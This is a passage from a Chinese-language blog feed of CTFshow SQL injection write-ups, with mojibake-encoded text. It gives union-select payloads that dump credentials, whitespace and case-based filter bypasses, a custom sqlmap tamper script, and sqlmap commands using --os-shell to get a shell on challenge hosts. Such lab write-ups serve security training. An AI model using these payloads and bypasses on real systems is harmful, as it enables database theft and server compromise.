class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">    retVal = b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(b64encode(<span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(retVal)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://63c468c1-0392-<span class="number">4832</span>-87ce-7fe0b3345449.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h2 id="pythonä¸­çš„-1"><a href="#pythonä¸­çš„-1" class="headerlink" title="pythonä¸­çš„[::-1]"></a>pythonä¸­çš„[::-1]</h2><p>åœ¨Pythonä¸­ï¼Œ[start:stop:step] æ˜¯ç”¨æ¥æˆªå–æˆ–æå–å­—ç¬¦ä¸²ï¼ˆæˆ–åˆ—è¡¨ç­‰å¯è¿­ä»£å¯¹è±¡ï¼‰çš„ä¸€ç§æ–¹æ³•ã€‚å½“çœç•¥ start å’Œ stop å‚æ•°æ—¶ï¼Œå®ƒä¼šé»˜è®¤ä½¿ç”¨æ•´ä¸ªå­—ç¬¦ä¸²ã€‚è€Œ step å‚æ•°è¡¨ç¤ºæ­¥é•¿ï¼Œæ§åˆ¶å–å€¼çš„æ–¹å‘å’Œé—´éš”ã€‚<br>å½“ step å‚æ•°ä¸ºè´Ÿæ•°æ—¶ï¼Œå³ [::-1]ï¼Œå®ƒè¡¨ç¤ºä»å­—ç¬¦ä¸²çš„æœ«å°¾å¼€å§‹ï¼Œä»¥å€’åºçš„æ–¹å¼å–å€¼ï¼Œæ­¥é•¿ä¸º1ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå®ç°äº†å°†å­—ç¬¦ä¸²åè½¬çš„æ•ˆæœã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜è¯¥ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">å¤åˆ¶ä»£ç </span><br><span class="line">string = &quot;Hello, World!&quot;</span><br><span class="line">reversed_string = string[::-1]</span><br><span class="line">print(reversed_string)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¤åˆ¶ä»£ç </span><br><span class="line">!dlroW ,olleH</span><br></pre></td></tr></table></figure><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h3 id="è‡ªå®šä¹‰tamper-2"><a href="#è‡ªå®šä¹‰tamper-2" class="headerlink" title="è‡ªå®šä¹‰tamper"></a>è‡ªå®šä¹‰tamper</h3><p>åŠ äº†ä¸€ä¸ªç©ºæ ¼è¿‡æ»¤ï¼Œä¿®æ”¹ä¸€ä¸‹è„šæœ¬å³å¯ã€‚<br>åœ¨è„šæœ¬æ“ä½œä¸­åŠ ä¸€è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br></pre></td></tr></table></figure><p>å³å¯ã€‚<br>payloadä¸å˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h3 id="è‡ªå®šä¹‰tamper-3"><a href="#è‡ªå®šä¹‰tamper-3" class="headerlink" title="è‡ªå®šä¹‰tamper"></a>è‡ªå®šä¹‰tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span><br><span class="line">  function decode($<span class="built_in">id</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($<span class="built_in">id</span>))));</span><br><span class="line">  &#125;</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ äº†ä¸ªæ˜Ÿå·ï¼Œæ— å…³ç—›ç—’ï¼Œè¿˜ç”¨ä¸Šä¸€é¢˜çš„å³å¯ã€‚<br>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://29fa0dfe-7f52-4f70-<span class="number">83e9</span>-2795e92dcb6b.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --tamper=ctfshow210 --batch -D ctfshow_web --dump</span><br></pre></td></tr></table></figure><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h3 id="â€“os-shell-ä¸€é”®getshell"><a href="#â€“os-shell-ä¸€é”®getshell" class="headerlink" title="â€“os-shell ä¸€é”®getshell"></a>â€“os-shell ä¸€é”®getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://97a2ce63-a000-<span class="number">4020</span>-838b-9eccc076d657.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210.py --os-shell</span><br></pre></td></tr></table></figure><h2 id="ä»€ä¹ˆæ˜¯â€“os-shell"><a href="#ä»€ä¹ˆæ˜¯â€“os-shell" class="headerlink" title="ä»€ä¹ˆæ˜¯â€“os-shell"></a>ä»€ä¹ˆæ˜¯â€“os-shell</h2><p>â€“os-shell å…¶æœ¬è´¨æ˜¯å†™å…¥ä¸¤ä¸ªshellæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯å¯ä»¥è®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼›<br>ä¸è¿‡ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œä¸Šä¼ æ–‡ä»¶æˆ‘ä»¬éœ€è¦å—åˆ°ä¸¤ä¸ªæ¡ä»¶çš„é™åˆ¶ï¼Œä¸€ä¸ªæ˜¯ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯å¯¼å…¥å¯¼å‡ºçš„æƒé™</p><p>åœ¨mysqlä¸­ï¼Œç”± secure_file_priv å‚æ•°æ¥æ§åˆ¶å¯¼å…¥å¯¼å‡ºæƒé™ï¼Œè¯¥å‚æ•°åé¢ä¸ºnullæ—¶ï¼Œåˆ™è¡¨ç¤ºä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼›å¦‚æœæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ™è¡¨ç¤ºä»…èƒ½åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­å¯¼å…¥å¯¼å‡ºï¼›å¦‚æœå‚æ•°åé¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å€¼æ—¶ï¼Œåˆ™è¡¨ç¤ºåœ¨ä»»ä½•æ–‡ä»¶å¤¹éƒ½èƒ½å¯¼å…¥å¯¼å‡º<br>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://899832c9-<span class="number">8556</span>-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;http://899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span>  --tamper=ctfshow210 --batch --level=<span class="number">5</span> --os-shell</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šå‡ºç°shellé¡µé¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175482915-61978078-d777-4dbe-820b-ad1b742325f8.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175522091-1b21cb86-9dfb-4896-8dca-fdd1bf8d1d85.png" alt="image.png"><br>æ‰§è¡Œå®Œè¾“å…¥qé€€å‡ºå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web171-web190SQLæ³¨å…¥ç¯‡</title>
      <link href="/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/07/11/web171-web190SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>web171</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¸‰æ ä¸€çœ¼ä¸çœŸï¼Œç›´æ¥å†…å®¹æ‹¼å…¥å³å¯ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>database() --+</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åº“åï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><code>information_schema,test,mysql,performance_schema,ctfshow_web</code><br>æŸ¥è¯¢è¡¨åï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><code>ctfshow_user</code><br>æŸ¥è¯¢å­—æ®µ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+</span><br></pre></td></tr></table></figure><p><code>id,username,password</code><br>ä¸‰æ ç›´æ¥è¾“å‡ºä¸‰ç§ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select id<span class="punctuation">,</span>username<span class="punctuation">,</span>password from ctfshow_web.ctfshow_user --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688962855743-a9561019-8b4a-4ad8-a1b9-9829a17ae716.png" alt="image.png"><br>å½“ç„¶ sqlmapä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ç›´æ¥å¼€æ³¨å…¥</p><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç°å®ä½ç½®å˜ä¸ºäº†ä¸¤ä¸ªã€‚<br>é€šè¿‡ä¸Šé¢˜çš„æ•°æ®åº“ç»“æ„å¯ä»¥ç›´æ¥å‡ºpayload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user2  --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688978037707-0ffcb803-78fd-4c25-93a9-2c20d87eaa92.png" alt="image.png"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¸€æ ·payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; union select <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_web.ctfshow_user3 --+</span><br></pre></td></tr></table></figure><h1 id="web174ã€web175"><a href="#web174ã€web175" class="headerlink" title="web174ã€web175"></a>web174ã€web175</h1><p>è¯´æ˜¯è€ƒçš„åŸºç¡€ï¼Œé‚£ä¹ˆå°±ä¸€æ­¥ä¸€æ­¥æ¥ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.$_GET<span class="punctuation">[</span>&#x27;id&#x27;<span class="punctuation">]</span>.<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;<span class="punctuation">,</span> json_encode($ret)))<span class="punctuation">&#123;</span></span><br><span class="line">      $ret<span class="punctuation">[</span>&#x27;msg&#x27;<span class="punctuation">]</span>=&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æœ‰è¿”å›è¿‡æ»¤äº†ã€‚<br>174ã€175æ€ä¹ˆè¾“å…¥ä»€ä¹ˆéƒ½æç¤ºé”™è¯¯ã€‚</p><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><h3 id="å¤§å°å†™ç»•è¿‡è¿‡æ»¤"><a href="#å¤§å°å†™ç»•è¿‡è¿‡æ»¤" class="headerlink" title="å¤§å°å†™ç»•è¿‡è¿‡æ»¤"></a>å¤§å°å†™ç»•è¿‡è¿‡æ»¤</h3><p>ç®€å•è¿‡æ»¤ï¼Œå¤§å°å†™å°±èƒ½ç»•è¿‡è¿‡æ»¤ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; uNion SeLeCt <span class="number">1</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password from ctfshow_user --+</span><br></pre></td></tr></table></figure><h1 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h1><h3 id="ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤"><a href="#ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤"></a>/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤</h3><blockquote><p><a href="https://blog.csdn.net/acsuccess/article/details/69360931">https://blog.csdn.net/acsuccess/article/details/69360931</a> ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</p></blockquote><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼ŒæŠŠç©ºæ ¼æ›´æ¢ä¸€ä¸‹å³å¯<br>ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§ç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•ã€‚</p><ul><li>æ³¨é‡Šç»•è¿‡ <code>/**/</code></li><li>æ‹¬å·ç»•è¿‡ <code>select(user())from dual where(1=1)and(2=2)</code></li></ul><p>é™¤æ­¤ä¹‹å¤–è¦æ³¨æ„ä¸€ä¸‹ï¼Œä¸Šé¢å‡ é“é¢˜çš„payloadä¸­çš„+ä¼šè¢«è½¬ä¹‰ä¸ºç©ºæ ¼ï¼Œå› æ­¤å¦‚æœä½¿ç”¨+å°±ä¼šå‡ºç°æ— æ³•æŸ¥è¯¢çš„æƒ…å†µã€‚<br>é‚£ä¹ˆå°±è¦ä½¿ç”¨urlè½¬ä¹‰æ¥ç»•è¿‡ç©ºæ ¼ã€‚<br>æ¯”å¦‚ï¼š</p><ul><li>Tab &gt; %09</li><li>æ¢é¡µç¬¦ &gt; %0c</li></ul><p>è¿™ä¸¤ä¸ªéƒ½æ˜¯å¯ä»¥çš„ã€‚<br>äºæ˜¯å°±å¯ä»¥å¾—åˆ°payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>id<span class="punctuation">,</span>username<span class="punctuation">,</span>password<span class="comment">/**/</span>from<span class="comment">/**/</span>ctfshow_user<span class="comment">/**/</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><h1 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h1><h3 id="ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤-1"><a href="#ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤-1" class="headerlink" title="/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤"></a>/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤</h3><p>æŠŠ<code>/**/</code>è¿‡æ»¤æ‰äº†é‚£å°±åªèƒ½ä½¿ç”¨ä¸Šé¢ä¸¤ä¸ªè½¬ä¹‰ç¬¦ç»•è¿‡äº†ã€‚<br>é‚£å°±ç”¨%09</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">09</span>union%<span class="number">09</span>select%<span class="number">091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">09</span>from%<span class="number">09</span>ctfshow_user%<span class="number">09</span>--%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œç»è¿‡æµ‹è¯•ï¼Œ<code>%09</code>å¯ä»¥æ›¿æ¢ä¸º<code>%0a-%0d</code>å‡å¯ä»¥</p><h1 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h1><h3 id="ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤-2"><a href="#ã€-09ã€-0a-dç»•è¿‡ç©ºæ ¼è¿‡æ»¤-2" class="headerlink" title="/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤"></a>/**/ã€%09ã€%0a-%dç»•è¿‡ç©ºæ ¼è¿‡æ»¤</h3><p><code>/**/</code>ç­‰éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨%0cå’Œ%0dç»•è¿‡è¿‡æ»¤ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">0</span>cunion%<span class="number">0</span>cselect%<span class="number">0</span>c1<span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">0</span>c--%<span class="number">0</span>c</span><br></pre></td></tr></table></figure><h1 id="web180-web182"><a href="#web180-web182" class="headerlink" title="web180-web182"></a>web180-web182</h1><p>è¿‡æ»¤äº†æ‰€æœ‰çš„ç©ºç™½ç¬¦å·ã€‚<br>è¿™é‡Œç½‘ä¸Šç»™çš„åŠæ³•æ˜¯ç›´æ¥å»æ ¹æ®idç›´æ¥æŸ¥ï¼Œå…¶å®ä¹Ÿå¯ä»¥ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;||id=<span class="number">26</span>||&#x27;</span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="number">-1</span>&#x27;or(id=<span class="number">26</span>)and&#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ç¬¬äºŒç§è¿™ç§å°†æœ«å°¾çš„å•å¼•å·é—­åˆå°±å¯ä»¥ä¸ç”¨æ³¨é‡Šç¬¦å·äº†</p><h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)<span class="punctuation">&#123;</span></span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;<span class="punctuation">,</span> $str);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ç§payloadã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=`ctfshow_user`where((substr(`pass`<span class="punctuation">,</span><span class="number">1</span><span class="punctuation">,</span><span class="number">8</span>)regexp(<span class="string">&quot;ctfshow&#123;&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=(ctfshow_user)where(pass)like&#x27;ctfshow<span class="punctuation">&#123;</span>%<span class="number">25</span>&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ†åˆ«è§£é‡Šä¸€ä¸‹ä¸¤ä¸ªè¯­å¥ï¼š</p><h2 id="regexpå’Œlikeå…³é”®å­—-å’Œ-æ ‡è¯†ç¬¦"><a href="#regexpå’Œlikeå…³é”®å­—-å’Œ-æ ‡è¯†ç¬¦" class="headerlink" title="regexpå’Œlikeå…³é”®å­— %å’Œ_æ ‡è¯†ç¬¦"></a>regexpå’Œlikeå…³é”®å­— %å’Œ_æ ‡è¯†ç¬¦</h2><p>ç¬¬ä¸€ä¸ªpayloadï¼š<br>REGEXP æ˜¯ SQL ä¸­çš„ä¸€ä¸ªæ¨¡å¼åŒ¹é…æ“ä½œç¬¦ï¼Œå®ƒç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å­ä¸²ã€‚<br>ç¬¬äºŒä¸ªpaylaodï¼š<br>LIKEæ“ä½œç¬¦ä½¿ç”¨å­—ç¬¦ä¸²åŒ¹é…æ¨¡å¼æ¥æ¯”è¾ƒåˆ—çš„å€¼ï¼Œå¸¸è§çš„æ¨¡å¼åŒ¹é…ç‰¹æ®Šå­—ç¬¦æ˜¯ % (ç™¾åˆ†å·) å’Œ _ (ä¸‹åˆ’çº¿)ã€‚<br>â€˜aa%â€™ï¼šè¿™æ˜¯ä¸€ä¸ªç”¨äºåŒ¹é…çš„æ¨¡å¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œâ€™aa%â€™è¡¨ç¤ºä»¥â€aaâ€å¼€å¤´çš„ä»»æ„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚%æ˜¯LIKEæ“ä½œç¬¦çš„é€šé…ç¬¦ï¼Œä»£è¡¨ä»»æ„æ•°é‡çš„å­—ç¬¦ï¼ˆåŒ…æ‹¬é›¶ä¸ªå­—ç¬¦ï¼‰ã€‚<br>ä¹Ÿå°±æ˜¯åŒ¹é…<code>aabbs</code><br>å½“æˆ‘ä»¬ä½¿ç”¨ LIKE æ“ä½œç¬¦å’Œä¸‹åˆ’çº¿ _ ç»“åˆæ—¶ï¼Œå®ƒè¡¨ç¤ºåŒ¹é…å•ä¸ªå­—ç¬¦çš„ä»»æ„ä½ç½®ï¼Œç±»ä¼¼äºé€šé…ç¬¦?<br>ä¹Ÿå°±æ˜¯åŒ¹é…<code>aab</code><br>è¿™é‡Œä½¿ç”¨pyå†™è„šæœ¬ã€‚<br>ç¬¬ä¸€ç§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 